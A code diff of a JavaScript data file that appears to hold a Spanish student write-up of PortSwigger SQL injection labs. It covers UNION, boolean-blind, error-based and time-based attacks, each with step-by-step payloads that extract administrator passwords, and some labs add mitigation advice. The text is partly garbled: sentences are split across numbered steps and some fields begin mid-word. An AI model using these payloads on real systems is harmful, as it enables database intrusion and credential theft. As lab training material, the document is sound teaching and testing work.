-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "Se inyecta el siguiente código:",
+                code: "Determinar el número de columnas de la tabla, utilizando un ‘ UNION SELECT NULL,"
+            },
+            {
+                title: "Paso 4",
+                text: "NULL- - y probando hasta que no haya error. En este caso, se confirma que hay dos",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "columnas.",
+                code: ""
+            },
+            {
+                title: "Paso 6",
+                text: "Determinar el tipo de datos de cada columna. Probar con un 'string' en la primera",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "columna y ver que da error, indicando que es numérica. Probar con 'string' en la",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "segunda columna y ver que no da error, indicando que acepta texto.",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "Inyectar el payload para extraer datos. Se recomienda usar la concatenación de la",
+                code: ""
+            },
+            {
+                title: "Paso 10",
+                text: "primera columna (username) y la segunda (password) de la tabla users . El payload",
+                code: ""
+            },
+            {
+                title: "Paso 11",
+                text: "Se inyecta el siguiente código:",
+                code: "sería similar a: UNION SELECT NULL, username || ':' || password FROM users--. Se"
+            },
+            {
+                title: "Paso 12",
+                text: "introduce un punto y coma como separador entre el usuario y la contraseña.",
+                code: ""
+            },
+            {
+                title: "Paso 13",
+                text: "Localizar en la respuesta del navegador la lista de usuarios y contraseñas.",
+                code: ""
+            },
+            {
+                title: "Paso 14",
+                text: "Identificar la credencial del usuario “administrador” .",
+                code: ""
+            },
+            {
+                title: "Paso 15",
+                text: "Ir a la sección \"My account\" y loguearse con la contraseña obtenida.",
+                code: ""
+            },
+            {
+                title: "Paso 16",
+                text: "Confirmación: Inicio de sesión exitoso como administrador y el laboratorio se marca",
+                code: ""
+            },
+            {
+                title: "Paso 17",
+                text: "como resuelto.",
+                code: ""
+            },
+            {
+                title: "Análisis del Payload",
+                text: "La parte SELECT NULL, username || ':' || password FROM  users solicita a la base de datos que busque en la tabla users y traiga los valores de las  columnas username y password, concatenados y separados por un carácter. La  cláusula UNION hace que estos datos se añadan a la consulta original y aparezcan  donde normalmente estarían los nombres de los productos, en la segunda columna que  acepta strings.",
+                code: ""
             },
         ],
+        images: [
+            "parcial2/act08_images/P12_img53.png",
+            "parcial2/act08_images/P12_img54.png",
+            "parcial2/act08_images/P13_img57.png",
+            "parcial2/act08_images/P13_img58.png",
+        ]
     },
     {
         id: 11,
@@ -329,29 +596,326 @@ const labsData = [
         level: "Practitioner",
         payload: "xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--",
         description: "Ataque lógico a ciegas: formulación de hipótesis lógicas para exfiltración forense remota indirecta.",
-        objective: "Derrotar arquitecturas modernas que ya no reflejan resultados de consulta en crudo (escondidas o ciegas) y que solo validan un contexto booleano (True/False) alterando elementos visibles en la interfaz del DOM (Mensaje de Bienvenida).",
-        analysis: "Se introduce una inyección con una sentencia Substring iteradora con Fuerza Bruta mediante herramientas como Burp Intruder. Formulamos: 'Si la primera letra del admin es A, muestra el saludo; si no, desaparece'. Iteramos letra por letra basándonos puramente en la respuesta del UI.",
-        impact: "Peligrosamente indetectable. Demuestra que no revelar errores sintácticos de SQL es una defensa insuficiente ante un auditor persistente.",
+        objective: "Obtener el usuario y la contraseña del administrador de la  tabla users.",
+        analysis: "Este tipo de ataque de inyección SQL no muestra errores o  información directamente en la página. En su lugar, el atacante deduce la información a  través de la respuesta del servidor a consultas condicionales, como la aparición o  ausencia de un mensaje específico en la página (\"Welcome Back\" en este caso) o  diferencias en el tiempo de respuesta. Esto permite al atacante extraer datos carácter  por carácter.",
+        impact: "endada: Validación de entradas y consultas parametrizadas: Utilizar  sentencias preparadas o consultas parametrizadas para separar el código SQL de los  datos de entrada del usuario. Esto previene que los comandos inyectados sean  ejecutados .  Sanitización estricta de entradas: Validar las entradas del usuario contra formatos  esperados y rechazar caracteres maliciosos .  Principio de mínimo privilegio: Configurar las cuentas de base de datos utilizadas  por la aplicación web con los permisos mínimos necesarios. Incluso si ocurre una  inyección, el daño estará limitado.  Manejo de errores no detallado: Evitar mostrar errores detallados de la base de datos  a los usuarios. Los mensajes genéricos impiden que los atacantes confirmen  inyecciones exitosas.  Web Application Firewalls (WAFs): Implementar WAFs con análisis de  comportamiento para detectar patrones indicativos de inyecciones SQL ciegas, como  consultas frecuentes y ligeramente variadas que desencadenan diferentes estados  HTTP o tiempos de respuesta.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "Acceder al laboratorio y observar el comportamiento de la aplicación:",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección Blind.",
-                code: "PAYLOAD: xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--"
+                title: "Paso 2",
+                text: "Navegar por las categorías (ej. \"Accessories\").",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "Se introduce una inyección con una sentencia Substring iteradora con Fuerza Bruta mediante herramientas como Burp Intruder. Formulamos: 'Si la primera letra del admin es A, muestra el saludo; si no, desaparece'. Iteramos letra por letra basándonos puramente en la respuesta del UI.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "Identificar el campo vulnerable (Cookies):",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: "Utilizar Burp Suite para interceptar la solicitud y modificar el valor de la cookie",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "Se inyecta el siguiente código:",
+                code: "TrackingId."
+            },
+            {
+                title: "Paso 6",
+                text: "Se inyecta el siguiente código:",
+                code: "Insertar una comilla simple ' en el valor de TrackingId y enviar la solicitud."
+            },
+            {
+                title: "Paso 7",
+                text: "Observar que el mensaje \"Welcome Back\" desaparece, lo que indica una inyección",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "SQL efectiva",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "Confirmar la existencia de la tabla users:",
+                code: ""
+            },
+            {
+                title: "Paso 10",
+                text: "Se inyecta el siguiente código:",
+                code: "Inyectar el siguiente payload en el valor de la cookie TrackingId: ' AND (SELECT 'a'"
+            },
+            {
+                title: "Paso 11",
+                text: "FROM users WHERE 'a'='a' LIMIT 1)--",
+                code: ""
+            },
+            {
+                title: "Paso 12",
+                text: "Si la tabla users existe, el mensaje \"Welcome Back\" reaparecerá . Si no, desaparecerá.",
+                code: ""
+            },
+            {
+                title: "Paso 13",
+                text: "Confirmar la existencia del usuario administrator:",
+                code: ""
+            },
+            {
+                title: "Paso 14",
+                text: "Inyectar el siguiente payload: ' AND (SELECT username FROM users WHERE",
+                code: ""
+            },
+            {
+                title: "Paso 15",
+                text: "Se inyecta el siguiente código:",
+                code: "username = 'administrator') = 'administrator'--"
+            },
+            {
+                title: "Paso 16",
+                text: "Si el usuario administrator existe, el mensaje \"Welcome Back\" reaparecerá.Si no,",
+                code: ""
+            },
+            {
+                title: "Paso 17",
+                text: "desaparecerá.",
+                code: ""
+            },
+            {
+                title: "Paso 18",
+                text: "Determinar la longitud de la contraseña del administrador:",
+                code: ""
+            },
+            {
+                title: "Paso 19",
+                text: "Inyectar payloads para probar la longitud de la contraseña. Por ejemplo, para saber si",
+                code: ""
+            },
+            {
+                title: "Paso 20",
+                text: "es mayor a 19 caracteres: ' AND (SELECT username FROM users WHERE username",
+                code: ""
+            },
+            {
+                title: "Paso 21",
+                text: "Se inyecta el siguiente código:",
+                code: "= 'administrator' AND LENGTH(password) > 19) = 'administrator'--"
+            },
+            {
+                title: "Paso 22",
+                text: "Ajustar el número hasta que el mensaje \"Welcome Back\" reaparezca, indicando la",
+                code: ""
+            },
+            {
+                title: "Paso 23",
+                text: "longitud correcta (la contraseña tiene 20 caracteres).",
+                code: ""
+            },
+            {
+                title: "Paso 24",
+                text: "El payload base para cada carácter es: ' AND (SELECT SUBSTRING(password,",
+                code: ""
+            },
+            {
+                title: "Paso 25",
+                text: "{posición_caracter}, 1) FROM users WHERE username = 'administrator') =",
+                code: ""
+            },
+            {
+                title: "Paso 26",
+                text: "Se inyecta el siguiente código:",
+                code: "'{caracter_a_probar}'--"
+            },
+            {
+                title: "Paso 27",
+                text: "Si el carácter probado en la posición actual es correcto, el mensaje \"Welcome Back\"",
+                code: ""
+            },
+            {
+                title: "Paso 28",
+                text: "reaparecerá. El script registrará el carácter y pasará a la siguiente posición.",
+                code: ""
+            },
+            {
+                title: "Paso 29",
+                text: "Se usará un script de Python que automatiza este proceso.",
+                code: ""
+            },
+            {
+                title: "Paso 30",
+                text: "●​ request:  para  hacer peticiones al servidor.",
+                code: ""
+            },
+            {
+                title: "Paso 31",
+                text: "●​ string: añadir los caracteres que queremos que se prueben.",
+                code: ""
+            },
+            {
+                title: "Paso 32",
+                text: "●​ urllib.parse: para evitar el https del servidor.",
+                code: ""
+            },
+            {
+                title: "Paso 33",
+                text: "●​ urllib3: para python 3",
+                code: ""
+            },
+            {
+                title: "Paso 34",
+                text: "Funcionamiento del codigo:",
+                code: ""
+            },
+            {
+                title: "Paso 35",
+                text: "Se inyecta el siguiente código:",
+                code: "●​ \"TrackingId=\": Es el prefijo de la cookie vulnerable."
+            },
+            {
+                title: "Paso 36",
+                text: "Se inyecta el siguiente código:",
+                code: "●​ \"o539b7p1d9s8z9o5\": Es el valor original de la cookie TrackingId."
+            },
+            {
+                title: "Paso 37",
+                text: "●​ \"';\": Se añade para cerrar la instrucción SQL original y permitir la inyección.",
+                code: ""
+            },
+            {
+                title: "Paso 38",
+                text: "●​ payload_url.format(i, char): Aquí es donde la plantilla del payload se formatea",
+                code: ""
+            },
+            {
+                title: "Paso 39",
+                text: "con la posición actual (i) y el carácter a probar (char).",
+                code: ""
+            },
+            {
+                title: "Paso 40",
+                text: "●​ requests.get(url, ...): Envía una petición GET a la url del laboratorio.",
+                code: ""
+            },
+            {
+                title: "Paso 41",
+                text: "Se inyecta el siguiente código:",
+                code: "●​ cookies={'TrackingId': cookie}: Establece el valor de la cookie TrackingId con el"
+            },
+            {
+                title: "Paso 42",
+                text: "payload SQL construido.",
+                code: ""
+            },
+            {
+                title: "Paso 43",
+                text: "●​ verify=False: Desactiva la verificación del certificado SSL/TLS del servidor, lo",
+                code: ""
+            },
+            {
+                title: "Paso 44",
+                text: "que a menudo es necesario en entornos de prueba o si hay problemas con los",
+                code: ""
+            },
+            {
+                title: "Paso 45",
+                text: "certificados.",
+                code: ""
+            },
+            {
+                title: "Paso 46",
+                text: "●​ if \"Welcome back\" in r.text:: El script verifica si el mensaje \"Welcome back\"",
+                code: ""
+            },
+            {
+                title: "Paso 47",
+                text: "Se inyecta el siguiente código:",
+                code: "aparece en el texto de la respuesta HTTP. Si el mensaje está presente, significa"
+            },
+            {
+                title: "Paso 48",
+                text: "que la condición SQL inyectada fue verdadera, y por lo tanto, el carácter",
+                code: ""
+            },
+            {
+                title: "Paso 49",
+                text: "adivinado es correcto para esa posición.",
+                code: ""
+            },
+            {
+                title: "Paso 50",
+                text: "●​ contraseña += char: Si el carácter es correcto, se añade a la variable",
+                code: ""
+            },
+            {
+                title: "Paso 51",
+                text: "contraseña.",
+                code: ""
+            },
+            {
+                title: "Paso 52",
+                text: "●​ break: Una vez que se encuentra el carácter correcto para la posición actual, el",
+                code: ""
+            },
+            {
+                title: "Paso 53",
+                text: "bucle interior se rompe, y el script pasa a la siguiente posición de la contraseña.",
+                code: ""
+            },
+            {
+                title: "Paso 54",
+                text: "Damos permisos al archivo y lo ejecutamos para obtener la contraseña , es importante",
+                code: ""
+            },
+            {
+                title: "Paso 55",
+                text: "decir que al reiniciar el laboratorio la cookie cambia por lo tanto la contraseña tambien",
+                code: ""
+            },
+            {
+                title: "Paso 56",
+                text: "lo hará.",
+                code: ""
+            },
+            {
+                title: "Paso 57",
+                text: "Iniciar sesión con las credenciales obtenidas:",
+                code: ""
+            },
+            {
+                title: "Paso 58",
+                text: "Una vez que el script haya extraído la contraseña completa, ir a la sección \"My",
+                code: ""
+            },
+            {
+                title: "Paso 59",
+                text: "account\" del laboratorio.",
+                code: ""
+            },
+            {
+                title: "Paso 60",
+                text: "Ingresar administrator como nombre de usuario y la contraseña obtenida.",
+                code: ""
+            },
+            {
+                title: "Paso 61",
+                text: "Iniciar sesión para resolver el laboratorio.",
+                code: ""
+            },
+            {
+                title: "Análisis del Payload",
+                text: "Los payloads utilizan operadores lógicos (AND) y funciones  SQL (SELECT, LENGTH, SUBSTRING) dentro de la sección de la cookie TrackingId.  Esto permite al atacante construir consultas que, aunque no devuelven datos  directamente, alteran el comportamiento de la página (el mensaje \"Welcome Back\") de  una manera que revela información sobre la base de datos de forma ciega.",
+                code: ""
             },
         ],
         images: [
             "parcial2/act08_images/P12_img53.png",
             "parcial2/act08_images/P12_img54.png",
+            "parcial2/act08_images/P13_img57.png",
+            "parcial2/act08_images/P13_img58.png",
         ]
     },
     {
@@ -361,29 +925,66 @@ const labsData = [
         level: "Practitioner",
         payload: "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
         description: "Uso malicioso y predeterminado del enrutamiento de errores aritméticos para inducir Data Leak.",
-        objective: "Obligar a una máquina que no refleja cambios booleanos a emitir errores HTTP de tipo 500 (Server Error) únicamente cuando nuestra suposición sobre el dato que nos roba o queremos es CIERTA.",
-        analysis: "Un ataque lógico condicionado por fallos forzados (usualmente división por 0 - DIV0). Si la letra actual inferida coincide con la contraseña real del administrador, invocamos el error cast/math, esto destruyendo la página web; si no es la contraseña, devolvemos un string vacío inofensivo que devuelve Status HTTP 200.",
-        impact: "Extrae cualquier dato por fuerza bruta apoyándose sobre una validación y manejo de excepciones defectuosa y mal manejada en el servidor (CWE-755).",
+        objective: "Obtener la contraseña del usuario administrador y usarla  para iniciar sesión.",
+        analysis: "Este tipo de ataque de SQL Injection no muestra los resultados  directamente en la pantalla. En su lugar, se infiere la información observando si la  consulta inyectada provoca un error en la base de datos o si devuelve un código de  estado 200. Al generar errores controlados basándose en condiciones verdaderas o  falsas, se puede determinar la existencia de tablas, usuarios o caracteres específicos  de la contraseña.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "Acceder al laboratorio y comprender la vulnerabilidad:",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección Blind.",
-                code: "PAYLOAD: ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
+                title: "Paso 2",
+                text: "Ingresar al laboratorio y observar que las categorías no son vulnerables.",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "Un ataque lógico condicionado por fallos forzados (usualmente división por 0 - DIV0). Si la letra actual inferida coincide con la contraseña real del administrador, invocamos el error cast/math, esto destruyendo la página web; si no es la contraseña, devolvemos un string vacío inofensivo que devuelve Status HTTP 200.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "Identificar que la inyección se realiza en el campo tracking ID de las cookie como indica",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: "en el lab.",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "Modificar el tracking ID y verificar que una comilla simple (') genera un error ,",
+                code: ""
+            },
+            {
+                title: "Paso 6",
+                text: "confirmando la vulnerabilidad.",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "Preparar Burp Suite para la inyección:",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "Interceptar la petición y enviarla al Repeater.",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "Determinar el tipo de base de datos:",
+                code: ""
+            },
+            {
+                title: "Paso 10",
+                text: "Inyectar un payload de prueba como ' || (SELECT '') || ' y observar que genera un error",
+                code: ""
             },
         ],
         images: [
             "parcial2/act08_images/P13_img57.png",
             "parcial2/act08_images/P13_img58.png",
+            "parcial2/act08_images/P15_img64.png",
+            "parcial2/act08_images/P15_img65.png",
         ]
     },
     {
@@ -393,26 +994,222 @@ const labsData = [
         level: "Practitioner",
         payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--",
         description: "Abuso de un mal manejo de errores del middleware donde el stacktrace refleja contenido literal.",
-        objective: "Explotar la verbosidad excesiva del debugger del backend para forzarlo a revelar la contraseña en el propio texto final del Throw Catch de la web.",
-        analysis: "Obligamos al motor SQL a tomar y convertir un texto crudo (la contraseña extraída por Sub-Query) a un dígito numérico `INT`. Esta operación naturalmente va a fallar, provocando que el motor de Base de Datos envíe textualmente el error 'Fallo al convertir la cadena (MIPASSWORD) al tipo int' arrojando nuestro objetivo sin esfuerzo.",
-        impact: "Riesgos por configuraciones por defecto expuestas (Information Leakage). La desactivación de los errores en las variables de producción elimina este vector instantáneamente.",
+        objective: "●​ Extraer la contraseña del usuario “administrator” de la tabla users.  ●​ Realiza un inicio de sesión exitoso con dichas credenciales para  comprometer la cuenta.",
+        analysis: "El laboratorio presenta una vulnerabilidad en el manejo de  cookies de rastreo (tracking cookies). El flujo de explotación se resume en los  siguientes puntos:  ●​ Punto de Inyección: La aplicación toma el valor de la cookie enviada por  el navegador y lo concatena directamente en una consulta SQL interna.  ●​ Mecanismo de Error: Aunque la aplicación no muestra los resultados  directos de la consulta (los registros de la tabla), está configurada para  mostrar errores detallados de la base de datos cuando una consulta falla.  ●​ Estrategia de Explotación: Se debe inyectar una sintaxis SQL maliciosa  que fuerce un error de conversión o de tipo de dato. Por ejemplo, al  intentar convertir una cadena de texto (la contraseña que queremos  robar) en un número entero, la base de datos generará un error similar a:​ ERROR: invalid input syntax for type integer: \"S3cur3P4ssw0rd\"  ●​ Fuga de Datos (Data Leaking): Al leer ese mensaje de error en la  pantalla, el atacante obtiene el dato que la base de datos intentó procesar  infructuosamente, logrando así \"sacar\" información de tablas a las que no  debería tener acceso.",
+        impact: "endada:  En este escenario, el atacante aprovecha los mensajes técnicos para obtener  información. La estrategia debe ser doble:  ●​ Consultas Preparadas (Sentencias Parametrizadas): Esta es la defensa  principal. En lugar de concatenar la cookie directamente en el string SQL, se usa  un marcador de posición (?). El motor de la base de datos trata el valor de la  cookie como un simple dato y no como parte del código ejecutable.  ●​ Desactivar Mensajes de Error Detallados: En entornos de producción, la  aplicación nunca debe mostrar errores internos del motor de base de datos  (como tipos de datos o nombres de columnas). Se debe configurar una página  de error genérica para el usuario, mientras que el error real se guarda en un log  privado para los desarrolladores.  ●​ Validación de Entrada: Si la cookie de rastreo debe tener un formato específico  (por ejemplo, solo letras y números), se debe validar mediante una expresión  regular antes de procesarla.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "Accederemos a la instancia que nos genere PortSwigger desde el navegador integrado",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección Error-based.",
-                code: "PAYLOAD: ' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--"
+                title: "Paso 2",
+                text: "de BurpSuite (sin tener activado el interceptor).",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "Obligamos al motor SQL a tomar y convertir un texto crudo (la contraseña extraída por Sub-Query) a un dígito numérico `INT`. Esta operación naturalmente va a fallar, provocando que el motor de Base de Datos envíe textualmente el error 'Fallo al convertir la cadena (MIPASSWORD) al tipo int' arrojando nuestro objetivo sin esfuerzo.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "Exploraremos la página para cargar distintas instancias. Una vez exploradas, irémos a",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: "Se inyecta el siguiente código:",
+                code: "la pestaña “Proxy”, a la sección “HTTP History”, y buscarémos cualquier petición GET ​"
+            },
+            {
+                title: "Paso 5",
+                text: "Se inyecta el siguiente código:",
+                code: "que contenga la Cookie “TrackingId”, y la envíamos al repetidor."
+            },
+            {
+                title: "Paso 6",
+                text: "Regresarémos a BurpSuite y enviaremos esa petición al repetidor. Al final del valor de",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "Se inyecta el siguiente código:",
+                code: "la Cookie de TrackingId, añadirémos una comilla simple, y enviaremos la solicitud por"
+            },
+            {
+                title: "Paso 8",
+                text: "medio del repetidor. Al enviarla y explorar en el contenido HTML, podemos observar",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "que nos muestra un error de consulta SQL.",
+                code: ""
+            },
+            {
+                title: "Paso 10",
+                text: "​",
+                code: ""
+            },
+            {
+                title: "Paso 11",
+                text: "Ahora sabemos que el contenido de la cookie sirve para realizar una consulta SQL.",
+                code: ""
+            },
+            {
+                title: "Paso 12",
+                text: "Añadirémos los caracteres de comentario (“--” en SQL) Si no nos muestra ningún error",
+                code: ""
+            },
+            {
+                title: "Paso 13",
+                text: "significa que nuestra consulta será válida de manera sintática.",
+                code: ""
+            },
+            {
+                title: "Paso 14",
+                text: "Después de la comilla simple, añadiremos la consulta “AND CAST((SELECT 1)) AS",
+                code: ""
+            },
+            {
+                title: "Paso 15",
+                text: "int)--”. De esta manera adaptaremos la consulta para incluir una subconsulta SELECT",
+                code: ""
+            },
+            {
+                title: "Paso 16",
+                text: "genérica y convertir el valor devuelto a un tipo de datos int.",
+                code: ""
+            },
+            {
+                title: "Paso 17",
+                text: "Como podremos ver, al enviar la solicitud nos arroja un error diciendo que la condición",
+                code: ""
+            },
+            {
+                title: "Paso 18",
+                text: "“AND” debe ser una exrpesión booleana. Modificaremos la condición, añadiendo un",
+                code: ""
+            },
+            {
+                title: "Paso 19",
+                text: "Se inyecta el siguiente código:",
+                code: "operador de comparació: “AND 1=CAST((SELECT 1) AS int)--.”"
+            },
+            {
+                title: "Paso 20",
+                text: "Al ejecutarla nos podremos dar cuenta que no arroja ningún error, por lo que la consulta",
+                code: ""
+            },
+            {
+                title: "Paso 21",
+                text: "SQL ahora tendrá la sintáxis correcta.",
+                code: ""
+            },
+            {
+                title: "Paso 22",
+                text: "Ahora, para la inyección, adaptaremos un SELECT genérico para que recupere los",
+                code: ""
+            },
+            {
+                title: "Paso 23",
+                text: "Se inyecta el siguiente código:",
+                code: "nombres de usuario de la base de datos: “AND 1=CAST((SELECT username FROM"
+            },
+            {
+                title: "Paso 24",
+                text: "users) AS int)--”.",
+                code: ""
+            },
+            {
+                title: "Paso 25",
+                text: "Obtendremos un error de nuevo. Nuestra consulta parece haberse truncado por el",
+                code: ""
+            },
+            {
+                title: "Paso 26",
+                text: "límite de caracteres permitido. Como resultado, los caracteres que añadimos para",
+                code: ""
+            },
+            {
+                title: "Paso 27",
+                text: "comentar la consulta (“--”) se ignoraron. Para solucionar esto, eliminaremos el",
+                code: ""
+            },
+            {
+                title: "Paso 28",
+                text: "contenido original de la cookie, para, de esta manera, liberar algunos caracteres,",
+                code: ""
+            },
+            {
+                title: "Paso 29",
+                text: "Se inyecta el siguiente código:",
+                code: "quedándonos solo como “TrackingId=' AND 1=CAST((SELECT username FROM users)"
+            },
+            {
+                title: "Paso 30",
+                text: "AS int)--”.",
+                code: ""
+            },
+            {
+                title: "Paso 31",
+                text: "Observamos que recibimos un nuevo mensaje de error, que parece haber sido",
+                code: ""
+            },
+            {
+                title: "Paso 32",
+                text: "generado por la base de datos. Esto sugiere que la consulta se ejecutó correctamente,",
+                code: ""
+            },
+            {
+                title: "Paso 33",
+                text: "pero sigue recibiendo un error porque la consulta devolvió más de una fila. La",
+                code: ""
+            },
+            {
+                title: "Paso 34",
+                text: "Se inyecta el siguiente código:",
+                code: "modificaremos para que solo regrese una sola columna: “TrackingId=' AND"
+            },
+            {
+                title: "Paso 35",
+                text: "Se inyecta el siguiente código:",
+                code: "1=CAST((SELECT username FROM users LIMIT 1) AS int)--”."
+            },
+            {
+                title: "Paso 36",
+                text: "Ya enviada la consulta, sabremos que el primer usuario en nuestra tabla es",
+                code: ""
+            },
+            {
+                title: "Paso 37",
+                text: "“administrator”. Ahora modificaremos la consulta para que nos muestre la contraseña:",
+                code: ""
+            },
+            {
+                title: "Paso 38",
+                text: "Se inyecta el siguiente código:",
+                code: "“TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--”."
+            },
+            {
+                title: "Paso 39",
+                text: "La contraseña se ha filtrado, siendo “n0qruhn61643ghsw146z”. Ahora podremos iniciar",
+                code: ""
+            },
+            {
+                title: "Paso 40",
+                text: "sesión con el usuario administrador y su contraseña, y de esta manera, completar el",
+                code: ""
+            },
+            {
+                title: "Paso 41",
+                text: "laboratorio.",
+                code: ""
             },
         ],
+        images: [
+            "parcial2/act08_images/P15_img64.png",
+            "parcial2/act08_images/P15_img65.png",
+            "parcial2/act08_images/P16_img68.png",
+            "parcial2/act08_images/P16_img69.png",
+        ]
     },
     {
         id: 14,
@@ -421,29 +1218,51 @@ const labsData = [
         level: "Practitioner",
         payload: "x'%3bSELECT+pg_sleep(10)--",
         description: "Inducción de pausas cronometradas y métrica de latencias para comprobar existencia en PostgreSQL.",
-        objective: "Comprobar definitivamente la existencia de una inyección en entornos absolutos de tipo BLIND, en la que incluso manipular fallas del código no tiene un impacto visible directo u asíncrono sobre la página del visor.",
-        analysis: "Se concatena o se encuadra un operador matemático transaccional de suspensión `pg_sleep(10)` en PostgreSQL o `WAITFOR DELAY` en otro. Si la respuesta del servidor Web aumenta abruptamente y sistemáticamente a más de diez segundos, la arquitectura es vulnerable.",
-        impact: "Primera barrera para un exfiltrado severo del tipo Time-based.",
+        objective: "Explotar la vulnerabilidad para pausar la ejecución de la  consulta y provocar un retraso de 10 segundos en la respuesta de la aplicación.",
+        analysis: "A diferencia de otros tipos de SQLi, en este caso el servidor ha  sido configurado para no mostrar diferencias visuales si la consulta falla o tiene éxito.  La lógica de ataque se basa en lo siguiente:  ●​ Inyección en la Cookie: Al igual que en el caso anterior, el punto de entrada es  la tracking cookie. El servidor ejecuta la consulta de forma síncrona, lo que  significa que la página web no terminará de cargar hasta que la base de datos  termine su proceso.  ●​ Uso de Funciones de Tiempo: El atacante inserta comandos que obligan a la  base de datos a \"esperar\". Dependiendo del motor de base de datos  (PostgreSQL, MySQL, Microsoft SQL Server), se utilizan funciones como:  ○​ pg_sleep(10)  ○​ WAITFOR DELAY '0:0:10'  ○​ SLEEP(10)  ●​ Confirmación de Vulnerabilidad: Si al enviar la cookie modificada la página  tarda exactamente 10 segundos adicionales en cargar, se confirma que el código  inyectado fue ejecutado por el motor de base de datos.  ●​ Extracción de Datos (Teórica): Aunque el objetivo aquí es solo el retraso, esta  técnica permite extraer información mediante condiciones: \"Si la primera letra de  la contraseña es 'A', espera 10 segundos; si no, responde de inmediato\".",
+        impact: "endada:  Dado que aquí no hay errores visibles, la mitigación se centra en evitar que el atacante  pueda \"comunicarse\" con la base de datos a través del tiempo de respuesta.  ●​ Uso estricto de ORMs o Sentencias Preparadas: Al igual que en el caso  anterior, usar herramientas como Entity Framework, Hibernate o PDO (con  parámetros) evita que comandos como pg_sleep() o WAITFOR DELAY sean  interpretados por la base de datos.  ●​ Limitación de Privilegios (Least Privilege): El usuario de la base de datos que  utiliza la aplicación web no debería tener permisos para ejecutar funciones de  sistema o de administración (como comandos de pausa o apagado) si no son  estrictamente necesarios para su función.  ●​ Web Application Firewall (WAF): Un WAF puede detectar patrones  sospechosos en las cookies, como palabras clave de SQL (SELECT, SLEEP,  UNION), y bloquear la solicitud antes de que llegue a la base de datos.  ●​ Timeouts en Consultas: Configurar un tiempo de espera máximo (timeout) para  las consultas en la base de datos. Si una consulta de una cookie tarda más de lo  normal (por ejemplo, más de 1 segundo), la conexión debe cortarse  automáticamente.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "Accederemos a la instancia de la práctica utilizando BurpSuite (sin interceptar). Iremos",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección Blind (Time).",
-                code: "PAYLOAD: x'%3bSELECT+pg_sleep(10)--"
+                title: "Paso 2",
+                text: "Se inyecta el siguiente código:",
+                code: "a HTML History y buscaremos aquella petición que contenga la Cookie “TrackingId”, y"
             },
             {
-                title: "Explotación y Análisis",
-                text: "Se concatena o se encuadra un operador matemático transaccional de suspensión `pg_sleep(10)` en PostgreSQL o `WAITFOR DELAY` en otro. Si la respuesta del servidor Web aumenta abruptamente y sistemáticamente a más de diez segundos, la arquitectura es vulnerable.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "la envíamos al repetidor.",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: "Se inyecta el siguiente código:",
+                code: "Dentro del repetidor, cambiaremos el contenido de TrackingId por"
+            },
+            {
+                title: "Paso 5",
+                text: "Se inyecta el siguiente código:",
+                code: "“TrackingId=x'||pg_sleep(10)--” y enviaremos la solicitud. Al enviarla, podremos ver"
+            },
+            {
+                title: "Paso 6",
+                text: "cómo tardará 10 segundos en cargarla.",
